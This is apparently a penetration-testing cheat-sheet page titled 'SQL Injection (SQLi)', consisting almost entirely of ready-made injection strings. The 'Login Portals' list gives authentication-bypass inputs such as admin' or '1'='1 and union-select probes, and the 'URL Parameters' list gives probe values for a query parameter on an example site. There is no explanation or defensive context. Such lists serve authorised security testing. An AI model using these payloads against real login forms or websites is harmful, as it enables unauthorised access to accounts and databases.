# SQL Injection (SQLi)

## Quick-Hitters

### Login Portals

{% code overflow="wrap" %}
```
admin' or '1'='1
" or ""="
' or 1=1 -- -
' union select 1,2,3 -- -
admin'-- -
' or "-'
" or ""-"
" or true--
' or true--
admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or 1=1 or "='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
```
{% endcode %}

### URL Parameters

For `https://site.com/?q=HERE`

{% code overflow="wrap" %}
```
/?q=1
/?q=1'
/?q=1"
/?q=[1]
/?q[]=1
/?q=1`
/?q=1\
/?q=1/*'*/
/?q=1/*!1111'*/
/?q=1'||'asd'||'   <== concat string
/?q=1' or '1'='1
/?q=1 or 1=1
/?q='or''='
```
{% endcode %}
